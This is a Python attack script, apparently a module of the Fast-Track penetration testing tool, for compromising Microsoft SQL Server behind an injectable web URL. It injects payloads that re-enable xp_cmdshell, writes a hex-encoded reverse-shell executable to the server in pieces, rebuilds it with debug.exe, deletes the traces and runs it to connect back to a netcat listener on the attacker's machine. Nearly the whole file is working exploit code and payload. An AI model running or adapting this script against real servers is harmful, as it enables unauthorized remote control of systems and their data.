#!/usr/bin/env python

import socket
import pexpect
import time
import sys
import os
import re

definepath=os.getcwd()
sys.path.append("%s/bin/ftsrc/" % (definepath))
import include

try:
   import psyco
   psyco.full()
except ImportError:
   pass
include.print_banner()
try:
   ipaddr=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
   ipaddr.connect(('google.com', 0))
   ipaddr.settimeout(2)   
   ipaddr=ipaddr.getsockname()[0]   
except Exception:
   print "    No internet connection detected, please enter your IP address manually.."
   ipaddr=raw_input("    Enter your IP Address: ")
try:
   targeturl=sys.argv[4]
except IndexError:
   
   print """

    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    Requirements: PExpect
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

    This module uses a reverse shell by using the binary2hex method for uploading.
    It does not require FTP or any other service, instead we are using the debug
    function in Windows to generate the executable.

    You will need to designate where in the URL the SQL Injection is by using 'INJECTHERE

    So for example, when the tool asks you for the SQL Injectable URL, type:

    http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah
             """

   targeturl=raw_input("""
    Enter the URL of the susceptible site, remember to put 'INJECTHERE for the injectible parameter

    Example:http://www.thisisafakesite.com/blah.aspx?id='INJECTHERE&password=blah

    <ctrl>-c to exit to Main Menu...

    Enter here: """)
try:
   match=re.search("http://", targeturl)
   if not match:
      match2=re.search("https://", targeturl)
      if not match2:
        choicehttp=raw_input("""
    Choice which of the following to attack:

    1. HTTP
    2. HTTPS

    Enter number: """)
        if choicehttp=='1':
            targeturl=("http://"+targeturl)
        if choicehttp=='2':
            targeturl=("https://"+targeturl)
except Exception, e: print e
ncstarter=os.popen2('xterm -geometry 60x20 -bg black -fg green -fn *-fixed-*-*-*-20-* -T "Fast-Track Binary Payload SQL Injector" -e nc -lvp 4444 2> /dev/null')
time.sleep(2)
#
# Had to break up into multiple different requests due to the size of the payload and URL request
#
# Binary2Hex code used from IllWill, very nice small reverse payload.
#   
# While this may look a little ugly from a cleanliness perspective, theres a weird bug echoing files through SQL. When using >> it doubles whatever
# the command you are entering, for example if you wanted ot echo blah, it would echo blah blah into the file, which caused a major issue when
# getting the debug format right.
#
# So I got around the above problem by echoing individual text files and then typing them into one large one. This ended up working (phew).
# 
# I ran the binary through olly as well as process explorer and filemon. It only makes one call out when executed and thats to the destiation thats
# specified. Safe executable. 
#
# Re-Enable XP_Cmdshell stored procedure just in case its disabled
string1=(r"""';exec master..sp_addextendedproc "xp_cmdshell", "C:\Program Files\Microsoft SQL Server\MSSQL\Binn\xplog70.dll";exec master..sp_configure "show advanced options", 1;RECONFIGURE;exec master..sp_configure "xp_cmdshell", 1;RECONFIGURE--""")
string3=(r"';exec master..xp_cmdshell 'echo n service.dll >1.txt';exec master..xp_cmdshell 'echo e 0100 >2.txt';exec master..xp_cmdshell 'echo 4d 5a 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 50 45 00 00 4c 01 02 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 00 00 00 02 00 00 00 00 00 00 00 00 00 00 df 42 00 00 10 00 00 00 00 10 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00 00 50 00 00 00 02 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00  >3.txt'--")
string4=(r"';exec master..xp_cmdshell 'echo e 0180>4.txt'--") 
string5=(r"';exec master..xp_cmdshell 'echo 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 db 42 00 00 14 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >5.txt'--") 
string6=(r"';exec master..xp_cmdshell 'echo e 0200 >6.txt'--") 
string7=(r"';exec master..xp_cmdshell 'echo 00 00 00 00 00 00 00 00 4d 45 57 00 46 12 d2 c3 00 30 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 02 d2 75 db 8a 16 eb d4 00 10 00 00 00 40 00 00 ef 02 00 00 00 02 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e0 00 00 c0 be 1c 40 40 00 8b de ad ad 50 ad 97 b2 80 a4 b6 80 ff 13 73 f9 33 c9 ff 13 73 16 33 c0 ff 13 73 21 b6 80 41 b0 10 ff 13  >7.txt'--")
string8=(r"';exec master..xp_cmdshell 'echo e 0280 >8.txt'--") 
string9=(r"';exec master..xp_cmdshell 'echo 12 c0 73 fa 75 3e aa eb e0 e8 72 3e 00 00 02 f6 83 d9 01 75 0e ff 53 fc eb 26 ac d1 e8 74 2f 13 c9 eb 1a 91 48 c1 e0 08 ac ff 53 fc 3d 00 7d 00 00 73 0a 80 fc 05 73 06 83 f8 7f 77 02 41 41 95 8b c5 b6 00 56 8b f7 2b f0 f3 a4 5e eb 9b ad 85 c0 75 90 ad 96 ad 97 56 ac 3c 00 75 fb ff 53 f0 95 56 ad 0f c8 40 59 74 ec 79 07 ac 3c 00 75 fb 91 40 50 55 ff 53 f4 ab 75 e7 c3 00 00 00 00 00  >9.txt'--")
string10=(r"';exec master..xp_cmdshell 'echo e 0300 >10.txt'--") 
string11=(r"';exec master..xp_cmdshell 'echo 33 c9 41 ff 13 13 c9 ff 13 72 f8 c3 b0 42 00 00 bd 42 00 00 00 00 00 00 00 40 40 00 30 01 40 00 00 10 40 00 00 10 40 00 68 1c 06 32 40 07 6a 01 e8 0e 7c 38 55 0c e8 42 02 c8 15 38 9e 6a 7e 38 ea 53 0c 7a 50 2c 16 74 41 30 fd 01 bf 55 b2 b1 33 6a 91 02 06 b2 7c 55 9a 27 a3 78 83 66 c7 05 64 7b 4f a6 38 67 bc 5d 50 66 94 3d 39 66 a3 68 7e 64 66 7e 21 7d 8b 73 0c d9 0a 6a 68 94 2d a1  >11.txt'--")
string12=(r"';exec master..xp_cmdshell 'echo e 0380 >12.txt'--") 
string13=(r"';exec master..xp_cmdshell 'echo 3a 7a 6f 48 15 ea 4c 05 11 50 64 90 10 4d 44 55 91 14 3c 40 78 6a 28 10 68 5d 28 ff 35 30 74 e8 a4 9e 51 54 55 a1 55 8d bf 6e 0e 0a 08 90 22 0b e1 51 14 e8 1f 81 4b c3 ff 25 24 20 bb 6f 2a 1c 06 43 18 21 14 bd c3 22 08 71 cc 01 55 8b ec 81 c4 7c fe ff 88 56 57 e8 60 ac dd 89 45 fc 33 1d c9 8b 75 7e 38 3c 1d 74 07 1e 22 40 f7 41 eb f4 51 d1 72 e9 00 e1 58 3b c1 74 0b 5f 5e 30 b8 03  >13.txt'--")
string14=(r"';exec master..xp_cmdshell 'echo e 0400 >14.txt'--") 
string15=(r"';exec master..xp_cmdshell 'echo b9 c9 c2 08 e1 86 49 8d bd 3c 70 e5 43 2a 09 cf 2f e0 02 b0 20 aa eb 73 f2 28 8d 85 15 39 8b f0 36 f8 33 2a 33 eb 1b 8b 03 66 32 07 ef 22 65 20 4d fe 22 11 e1 28 2d ed 94 08 83 b9 dc b7 30 4b 74 fb 3b 3a 4d 08 a8 15 59 65 1d 67 0a 4c 13 41 1d 0f 14 eb e6 aa 0d 36 07 19 87 38 f4 b0 7f c0 55 73 11 8b 7d 0c c6 17 b8 02 7f 82 a2 13 9d 68 b0 a0 58 34 33 0d 46 0d e6 d1 f7 e1 fe 58 a3 ee  >15.txt'--")
string16=(r"';exec master..xp_cmdshell 'echo e 0480 >16.txt';exec master..xp_cmdshell 'echo e7 44 bb 1f 16 a9 ce 11 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 e2 30 83 c4 07 f4 6a f5 e8 69 09 19 49 ff bd 82 aa 20 0b d0 2a 93 75 37 f8 50 22 9d 29 86 06 fc e8 4d 2f 68 8b 24 38 e6 53 1a 0f 08 8d 50 03 21 18 83 c0 04 e3 f9 ff fe 80 02 f7 d3 23 cb 81 e1 44 80 74  >17.txt'--") 
string17=(r"';exec master..xp_cmdshell 'echo e7 44 bb 1f 16 a9 ce 11 04 de 55 01 3c d4 14 d4 0e 1b 33 c0 4e ec 87 0b 70 d2 8a 06 46 3d 3c 02 b3 12 0e f7 df 90 eb 0b 2c 30 19 8d 0c 89 06 48 83 2d 0a c0 75 f1 e8 04 11 33 51 c2 38 e2 30 83 c4 07 f4 6a f5 e8 69 09 19 49 ff bd 82 aa 20 0b d0 2a 93 75 37 f8 50 22 9d 29 86 06 fc e8 4d 2f 68 8b 24 38 e6 53 1a 0f 08 8d 50 03 21 18 83 c0 04 e3 f9 ff fe 80 02 f7 d3 23 cb 81 e1 44 80 74  >17.txt'--")
string18=(r"';exec master..xp_cmdshell 'echo e 0500 >18.txt'--")
string19=(r"';exec master..xp_cmdshell 'echo 7c e9 6c c1 0c 60 75 77 06 f4 10 c0 40 02 d0 e1 1b c2 51 5b 3a 47 c4 49 19 ca 0c 57 06 08 30 00 00 30 40 00 63 30 6d 64 00 66 3f 40 00 14 38 20 40 03 77 73 32 5f 33 98 2e 64 6c e3 c0 80 67 07 65 74 68 6f 73 40 62 79 6e 61 7b 6d cf 1e 63 9e 3c f7 eb ff 0e 12 57 53 41 5d cf 61 72 46 75 70 18 79 68 ca 2c 73 13 4f 26 63 6b 62 ef c1 ff b8 03 6c 95 1a 72 ca 5e 6c 4c c7 57 d3 69 74 f3 46  >19.txt'--")
string20=(r"';exec master..xp_cmdshell 'echo e 0580 >20.txt'--")
string21=(r"';exec master..xp_cmdshell 'echo a7 bc 91 47 c3 4c 43 6f 6d 88 61 6e 64 36 4c 69 44 62 7e 80 76 72 fb 9d 3a 50 b7 82 e7 73 15 41 58 21 c0 64 48 d0 43 2f 60 00 00 00 00 00 66 3f 40 00 4c 6f 61 64 4c 69 62 72 61 72 79 41 00 47 65 74 50 72 6f 63 41 64 64 72 65 73 73 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0c 40 00 00 e9 74 be ff ff 00 00 00 02 00 00 00 0c 40 00 00  >21.txt'--")
# Convert the crazy text files into one file
string22=(r"';exec master..xp_cmdshell 'echo r cx >22.txt';exec master..xp_cmdshell 'echo 04ef >23.txt';exec master..xp_cmdshell 'echo w >24.txt';exec master..xp_cmdshell 'echo q >25.txt';exec master..xp_cmdshell 'type 1.txt > reverse.txt';exec master..xp_cmdshell 'type 2.txt >> reverse.txt';exec master..xp_cmdshell 'type 3.txt >> reverse.txt';exec master..xp_cmdshell 'type 4.txt >> reverse.txt';exec master..xp_cmdshell 'type 5.txt >> reverse.txt';exec master..xp_cmdshell 'type 6.txt >> reverse.txt';exec master..xp_cmdshell 'type 7.txt >> reverse.txt';exec master..xp_cmdshell 'type 8.txt >> reverse.txt';exec master..xp_cmdshell 'type 9.txt >> reverse.txt';exec master..xp_cmdshell 'type 10.txt >> reverse.txt';exec master..xp_cmdshell 'type 11.txt >> reverse.txt';exec master..xp_cmdshell 'type 12.txt >> reverse.txt';exec master..xp_cmdshell 'type 13.txt >> reverse.txt';exec master..xp_cmdshell 'type 14.txt >> reverse.txt';exec master..xp_cmdshell 'type 15.txt >> reverse.txt';exec master..xp_cmdshell 'type 16.txt >> reverse.txt';exec master..xp_cmdshell 'type 17.txt >> reverse.txt';exec master..xp_cmdshell 'type 18.txt >> reverse.txt';exec master..xp_cmdshell 'type 19.txt >> reverse.txt';exec master..xp_cmdshell 'type 20.txt >> reverse.txt';exec master..xp_cmdshell 'type 21.txt >> reverse.txt';exec master..xp_cmdshell 'type 22.txt >> reverse.txt';exec master..xp_cmdshell 'type 23.txt >> reverse.txt';exec master..xp_cmdshell 'type 24.txt >> reverse.txt';exec master..xp_cmdshell 'type 25.txt >> reverse.txt'--")
# Convert to an executable
string23=(r"';exec master..xp_cmdshell 'debug<reverse.txt';exec master..xp_cmdshell 'copy service.dll reverse.exe'--")
# Cleanup
string24=(r"';exec master ..xp_cmdshell 'del 1.txt';exec master ..xp_cmdshell 'del 2.txt';exec master ..xp_cmdshell 'del 3.txt';exec master ..xp_cmdshell 'del 4.txt';exec master ..xp_cmdshell 'del 5.txt';exec master ..xp_cmdshell 'del 6.txt';exec master ..xp_cmdshell 'del 7.txt';exec master ..xp_cmdshell 'del 8.txt';exec master ..xp_cmdshell 'del 9.txt';exec master ..xp_cmdshell 'del 10.txt';exec master ..xp_cmdshell 'del 11.txt';exec master ..xp_cmdshell 'del 12.txt';exec master ..xp_cmdshell 'del 13.txt';exec master ..xp_cmdshell 'del 14.txt'--")
string25=(r"';exec master ..xp_cmdshell 'del 15.txt';exec master ..xp_cmdshell 'del 16.txt';exec master ..xp_cmdshell 'del 17.txt';exec master ..xp_cmdshell 'del 18.txt';exec master ..xp_cmdshell 'del 19.txt';exec master ..xp_cmdshell 'del 20.txt';exec master ..xp_cmdshell 'del 21.txt';exec master ..xp_cmdshell 'del 22.txt';exec master ..xp_cmdshell 'del 23.txt';exec master ..xp_cmdshell 'del 24.txt';exec master ..xp_cmdshell 'del 25.txt';exec master ..xp_cmdshell 'del reverse.txt';exec master ..xp_cmdshell 'del service.dll'--")
# Actually execute the reverse shell
string26=(r"';exec master..xp_cmdshell 'reverse.exe %s 4444'--" % (ipaddr))
sqlreplace1 = targeturl.replace("'INJECTHERE", """%s""" % (string1))
sqlreplace3 = targeturl.replace("'INJECTHERE", """%s""" % (string3))
sqlreplace4 = targeturl.replace("'INJECTHERE", """%s""" % (string4))
sqlreplace5 = targeturl.replace("'INJECTHERE", """%s""" % (string5))
sqlreplace6 = targeturl.replace("'INJECTHERE", """%s""" % (string6))
sqlreplace7 = targeturl.replace("'INJECTHERE", """%s""" % (string7))
sqlreplace8 = targeturl.replace("'INJECTHERE", """%s""" % (string8))
sqlreplace9 = targeturl.replace("'INJECTHERE", """%s""" % (string9))
sqlreplace10 = targeturl.replace("'INJECTHERE", """%s""" % (string10))
sqlreplace11 = targeturl.replace("'INJECTHERE", """%s""" % (string11))
sqlreplace12 = targeturl.replace("'INJECTHERE", """%s""" % (string12))
sqlreplace13 = targeturl.replace("'INJECTHERE", """%s""" % (string13))
sqlreplace14 = targeturl.replace("'INJECTHERE", """%s""" % (string14))
sqlreplace15 = targeturl.replace("'INJECTHERE", """%s""" % (string15))
sqlreplace16 = targeturl.replace("'INJECTHERE", """%s""" % (string16))
sqlreplace17 = targeturl.replace("'INJECTHERE", """%s""" % (string17))
sqlreplace18 = targeturl.replace("'INJECTHERE", """%s""" % (string18))
sqlreplace19 = targeturl.replace("'INJECTHERE", """%s""" % (string19))
sqlreplace20 = targeturl.replace("'INJECTHERE", """%s""" % (string20))
sqlreplace21 = targeturl.replace("'INJECTHERE", """%s""" % (string21))
sqlreplace22 = targeturl.replace("'INJECTHERE", """%s""" % (string22))
sqlreplace23 = targeturl.replace("'INJECTHERE", """%s""" % (string23))
sqlreplace24 = targeturl.replace("'INJECTHERE", """%s""" % (string24))
sqlreplace25 = targeturl.replace("'INJECTHERE", """%s""" % (string25)) 
sqlreplace26 = targeturl.replace("'INJECTHERE", """%s""" % (string26))
try:
   import urllib2
   print "    Sending initial request to enable xp_cmdshell if disabled...."
   connect1=urllib2.urlopen("""%s""" % (sqlreplace1).replace(" ", "%20"))
 #  print "Trying to kill various anti-virus before converting the payload.."
   print "    Sending first portion of payload (1/4)...."
   connect3=urllib2.urlopen("""%s""" % (sqlreplace3).replace(" ", "%20"))
   connect4=urllib2.urlopen("""%s""" % (sqlreplace4).replace(" ", "%20"))
   connect5=urllib2.urlopen("""%s""" % (sqlreplace5).replace(" ", "%20"))
   print "    Sending second portion of payload (2/4)...."
   connect6=urllib2.urlopen("""%s""" % (sqlreplace6).replace(" ", "%20"))
   connect7=urllib2.urlopen("""%s""" % (sqlreplace7).replace(" ", "%20"))
   connect8=urllib2.urlopen("""%s""" % (sqlreplace8).replace(" ", "%20"))
   connect9=urllib2.urlopen("""%s""" % (sqlreplace9).replace(" ", "%20"))
   print "    Sending third portion of payload (3/4)..."
   connect10=urllib2.urlopen("""%s""" % (sqlreplace10).replace(" ", "%20"))
   connect11=urllib2.urlopen("""%s""" % (sqlreplace11).replace(" ", "%20"))
   connect12=urllib2.urlopen("""%s""" % (sqlreplace12).replace(" ", "%20"))
   connect13=urllib2.urlopen("""%s""" % (sqlreplace13).replace(" ", "%20"))
   connect14=urllib2.urlopen("""%s""" % (sqlreplace14).replace(" ", "%20"))
   connect15=urllib2.urlopen("""%s""" % (sqlreplace15).replace(" ", "%20"))
   connect16=urllib2.urlopen("""%s""" % (sqlreplace16).replace(" ", "%20"))
   connect17=urllib2.urlopen("""%s""" % (sqlreplace17).replace(" ", "%20"))
   print "    Sending the last portion of the payload (4/4)..."
   connect18=urllib2.urlopen("""%s""" % (sqlreplace18).replace(" ", "%20"))
   connect19=urllib2.urlopen("""%s""" % (sqlreplace19).replace(" ", "%20"))
   connect20=urllib2.urlopen("""%s""" % (sqlreplace20).replace(" ", "%20"))
   connect21=urllib2.urlopen("""%s""" % (sqlreplace21).replace(" ", "%20"))
   print '    Running cleanup before executing the payload...'
   connect22=urllib2.urlopen("""%s""" % (sqlreplace22).replace(" ", "%20"))
   connect23=urllib2.urlopen("""%s""" % (sqlreplace23).replace(" ", "%20"))
   connect24=urllib2.urlopen("""%s""" % (sqlreplace24).replace(" ", "%20"))
   connect25=urllib2.urlopen("""%s""" % (sqlreplace25).replace(" ", "%20"))
   print "    Running the payload on the server..."
   connect26=urllib2.urlopen("""%s""" % (sqlreplace26).replace(" ", "%20"))
   print "     You should have a shell if everything went good..Might take a couple seconds\n"
except Exception,e:
   print e
   print '     Something went wrong, did you enter the IP address right??\n\nAlso, might not be running as "SA".\nYou will need to close the xterm window manually.'
   time.sleep(4)
 